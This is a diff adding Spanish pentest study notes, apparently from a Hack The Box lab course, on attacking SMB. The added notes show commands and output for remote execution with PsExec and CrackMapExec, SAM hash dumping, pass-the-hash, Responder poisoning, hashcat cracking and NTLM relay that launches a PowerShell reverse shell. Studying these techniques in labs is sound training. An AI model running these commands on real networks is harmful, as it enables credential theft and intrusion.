@@ -40,6 +40,22 @@ IBM desarrolló una **interfaz de programación de aplicaciones (API)** para la 
 
 ### SMBclient - Conectando
 
+El uso básico es este:
+
+```bash
+smbclient //SERVIDOR/RECURSO -U [DOMINIO\\]USUARIO[%PASSWORD]
+```
+
+Podemos especificar usuario y contraseña así:
+
+```bash
+smbclient //SERVIDOR/RECURSO --user usuario[%password]
+### Ejemplo ###
+smbclient //192.168.1.1/share --user='admin%admin$123'
+```
+
+La siguiente opción es sin especificar usuario:
+
 ```shell-session
 amr251@htb[/htb]$ smbclient -N -L //10.129.14.128
 
@@ -241,3 +257,155 @@ SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LO
 SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
 ```
 
+### Ejecución remota de códigos (RCE)
+
+PsExec es una herramienta que ejecuta procesos en otros sistemas, completa con total interactividad para aplicaciones de consola sin tener que instalar manualmente software cliente. Podemos descargarlo de [aquí](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) o usar implementaciones en Linux:
+- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py): Python PsExec usando RemComSvc
+- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py): Similar al anterior, pero va un paso más allá instalando un servidor local para recibir el output de los comandos. Esto es útil cuando la máquina objetivo no tiene un share con permisos de escritura disponible
+- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py):  Ejecuta un comando a través del administrador de tareas
+- CrackMapExec
+- Metasploit Exec
+##### Impacket PsExec
+
+Para usarlo necesitamos proporcionar el dominio/usuario, la contraseña y la IP de la máquina objetivo.
+
+```bash
+amr251@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+```
+
+##### CrackMapExec
+
+Una ventaja de esta herramienta es su disponibilidad para ejecutar un comando en múltiples hosts a la vez. Para usarlo, necesitamos especificar el protocolo, la dirección IP o rango, y las siguientes opciones:
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
+SMB         10.10.110.17 445    WIN7BOX  nt authority\system
+```
+
+##### Enumerando usuarios logueados
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+```
+
+##### Extraer hashes de la BBDD SAM
+
+Security Account Manager (SAM) es un archivo de BBDD que guarda las contraseñas de los usuarios. Se puede usar para autenticar usuarios locales y remotos. Si ganamos permisos admin de la máquina podemos extraer los hashes para diferentes propósitos:
+
+- Autenticarnos como otro usuario
+- Adivinar contraseñas, y si lo conseguimos, reusarlas para otros servicios o cuentas
+- Pass the hash
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
+SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
+SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
+SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
+```
+
+##### Pass the Hash (PtH)
+
+Consultar [[Pass the Hash]]. Si conseguimos el hash NTLM de un usuario, y no podemos adivinarlo, podemos usar su hash para autenticarnos sobre SMB con esta técnica, que permite a un atacante autenticarse a un servidor remoto o servicio remoto usando el hash NTLM en vez de su contraseña en claro. Podemos usarlo con cualquier herramienta de `Impacket`, SMBMap, CrackMapExec...
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
+```
+
+##### Ataques forzados de autenticación
+
+Podemos también abusar del protocolo SMB creando un servidor SMB falso para capturar hashes NTLM v1/2. La forma más común es usando `Responder`. 
+
+```shell-session
+amr251@htb[/htb]$ responder -I <interface name>
+```
+
+Cuando un usuario o sistema intenta realizar una **resolución de nombres (NR)**, la máquina sigue una serie de pasos para obtener la dirección IP de un host a partir de su nombre (hostname). En sistemas Windows, el procedimiento es aproximadamente el siguiente:
+
+1. Se necesita la dirección IP del recurso compartido (hostname).    
+2. Se consulta el archivo local de hosts: `C:\Windows\System32\Drivers\etc\hosts`.    
+3. Si no se encuentra ningún registro allí, se revisa la **caché DNS local**, que almacena nombres resueltos recientemente.    
+4. Si tampoco hay registros en la caché, se envía una consulta al **servidor DNS configurado**.    
+5. Si todas las opciones anteriores fallan, se envía una **consulta por multidifusión (multicast)** a la red, solicitando a otras máquinas la IP del recurso compartido.
+
+Supón que un usuario escribe mal el nombre de una carpeta compartida: `\\mysharefoder\` en lugar de `\\mysharedfolder\`. Como ese nombre no existe, todas las resoluciones de nombre fallan y la máquina termina enviando una consulta multicast a toda la red.
+
+Este comportamiento presenta un problema de seguridad: **no se valida la integridad de las respuestas**. Un atacante podría interceptar la consulta, falsificar una respuesta (spoofing) y hacer que la víctima confíe en un servidor malicioso. Esto suele usarse para **robar credenciales**.
+
+```shell-session
+amr251@htb[/htb]$ sudo responder -I ens33
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+...SNIP...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser:win7box:(...)
+
+```
+
+Las credenciales capturadas pueden ser:
+
+- **Descifradas (crackeadas)** utilizando herramientas como `hashcat`.    
+- **Reenviadas (relayed)** a un host remoto para completar la autenticación y **suplantar al usuario**.    
+
+Todos los _hashes_ guardados se almacenan en el directorio de logs de **Responder**:  
+`/usr/share/responder/logs/`
+
+Podemos copiar un _hash_ a un archivo y usar `hashcat` con el módulo **5600** para intentar crackearlo.
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Si no logramos descifrarlo, podemos **reutilizar (relay)** el hash capturado para autenticarnos en otra máquina. Para esto, podemos usar:
+
+- [`impacket-ntlmrelayx`](https://github.com/fortra/impacket)    
+- `Responder` con el script `MultiRelay.py`    
+
+**Ejemplo con `impacket-ntlmrelayx`**
+
+**Paso 1:** Desactivar SMB en la configuración de Responder  - Archivo: `/etc/responder/Responder.conf`. Esto evita conflictos, ya que `Responder` y `ntlmrelayx` no pueden usar el mismo puerto SMB al mismo tiempo.
+
+```shell-session
+amr251@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
+
+SMB = Off
+```
+
+Entonces, ejecutamos `impacket-ntlmrelayx` con la opción `--no-http-server`, `-smb2support` y la IP de la máquina objetivo con la opción `-t`. Por defecto, dumpeará la BBDD SAM, pero podemos ejecutar comandos con el flag `-c`.
+
+```shell-session
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+```
+
+Podemos crear una Reverse Shell usando [https://www.revshells.com/](https://www.revshells.com/), poner nuestra IP y puerto y la opción de PowerShell Base64. 
+
+```shell-session
+amr251@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e ...'
+```
+
+##### RPC
+
+Además de autenticarnos, podemos usar RPC para hacer cambios en el sistema, como cambiar la contraseña de un usuario, crear un nuevo dominio o una nueva carpeta compartida. 
